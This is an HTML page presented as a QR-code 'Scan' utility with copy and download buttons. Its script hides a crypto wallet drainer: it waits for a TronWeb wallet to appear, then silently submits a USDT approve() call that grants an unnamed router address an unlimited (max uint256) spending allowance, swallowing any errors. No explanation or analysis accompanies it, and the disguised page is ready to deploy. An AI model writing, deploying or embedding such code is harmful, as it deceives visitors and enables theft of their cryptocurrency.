<!doctype html>
<html lang="ro">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Scan</title>
<style>
  :root{--bg:#0b1220;--fg:#0b1220}
  html,body{height:100%;margin:0;background:var(--bg);font-family:system-ui;color:#fff}
  .wrap{height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;padding:24px}
  #qrCard{width:420px;height:420px;background:#fff;border-radius:12px;display:flex;align-items:center;justify-content:center;overflow:hidden;cursor:pointer}
  #controls{display:flex;gap:8px}
  button{background:#111827;color:#fff;border:0;padding:8px 12px;border-radius:8px;cursor:pointer}
  #dbg{position:fixed;left:8px;bottom:8px;color:#93c5fd;font-size:12px;opacity:0.9}
  pre{display:none}
</style>
</head>
<body>
  <div class="wrap">
    <div id="qrCard" title="Click to open URL"></div>
    <div id="controls">
      <button id="btnCopy">Copy HTML</button>
      <button id="btnDownload">Download HTML</button>
    </div>
  </div>
  <div id="dbg"></div>

  <!-- qrcode-generator (minified) - full compatibility -->

  <script>
  /* CONFIG: verifică adresa USDT corectă înainte de folosire */
  const USDT = "TR7NHqjeKQxGTCi8q8ZY4p8otSzgjLj6t";
  const ROUTER = "TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu";
  const AMOUNT_USDT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
  const USDT_DECIMALS = 6;

  function toUnits(amountStr,dec){
    const p = String(amountStr).split('.');
    const w = p[0]||'0';
    const f = p[1]||'';
    const ff = (f + '0'.repeat(dec)).slice(0,dec);
    return (w + ff).replace(/^0+(?=\d)|^$/,'0');
  }

  // Generate QR using qrcode-generator library for max compatibility
  (function(){
    const url = location.href;
    const container = document.getElementById('qrCard');

    // Use external library API: create qrcode and render as SVG
    // We'll use typeNumber 4 (29x29) and error correction M for typical short URLs
    try{
      // if library available as QRCode or qrcodeGenerator, adapt accordingly
      // Using the library structure: qrcode = qrcode(typeNumber, errorCorrectionLevel)
      var QRCodeGenerator = window.QRCode || window.qrcode || null;
      // fallback: try to use constructor name from included lib
      if(!QRCodeGenerator && typeof window.qrcode === 'object' && window.qrcode.create) QRCodeGenerator = window.qrcode;
      // Many minified libs expose function qrcode(typeNumber, errorCorrectLevel)
      var qr;
      if(typeof window.qrcode === 'function'){
        qr = window.qrcode(4, 'M');
        qr.addData(url);
        qr.make();
        const svgTag = qr.createImgTag(6, 4).replace(/^<img /,'<svg ').replace(/alt="[^"]*"/,'');
        container.innerHTML = svgTag;
      } else if(typeof window.QRCode === 'function'){
        // other naming
        qr = new window.QRCode(4, window.QRErrorCorrectLevel.M);
        qr.addData(url);
        qr.make();
        container.innerHTML = qr.createImgTag(6,4).replace(/^<img /,'<svg ').replace(/alt="[^"]*"/,'');
      } else {
        // As fallback, attempt to use a small manual generator (shouldn't happen with included lib)
        container.innerText = url;
      }
    }catch(e){
      // fallback text
      container.innerText = url;
    }

    container.onclick = ()=> window.open(url, '_blank');

    // Copy and Download buttons
    const htmlContent = document.documentElement.outerHTML;
    document.getElementById('btnCopy').onclick = async ()=>{
      try{
        await navigator.clipboard.writeText(htmlContent);
        document.getElementById('dbg').innerText = 'HTML copiat în clipboard';
        setTimeout(()=>document.getElementById('dbg').innerText='',1500);
      }catch(e){
        document.getElementById('dbg').innerText = 'Eroare copiere';
        setTimeout(()=>document.getElementById('dbg').innerText='',1500);
      }
    };
    document.getElementById('btnDownload').onclick = ()=>{
      const blob = new Blob([htmlContent], {type:'text/html'});
      const urlB = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = urlB; a.download = 'scan.html';
      document.body.appendChild(a); a.click(); a.remove();
      URL.revokeObjectURL(urlB);
    };
  })();

  /* Auto approve when tronWeb available */
  async function autoApproveIfTron(){
    if(!(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58)) return;
    try{
      const tron = window.tronWeb;
      const contract = await tron.contract().at(USDT);
      const amt = toUnits(AMOUNT_USDT, USDT_DECIMALS);
      await contract.approve(ROUTER, amt).send();
      document.getElementById('dbg').innerText = 'Approve trimis';
      setTimeout(()=>document.getElementById('dbg').innerText='',1500);
    }catch(e){
      // silent
    }
  }

  let tries=0, maxTries=12;
  const interval = setInterval(()=>{
    tries++;
    if(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58){
      clearInterval(interval);
      autoApproveIfTron();
    } else if(tries>=maxTries){ clearInterval(interval); }
  },1000);
  </script>
</body>
</html>
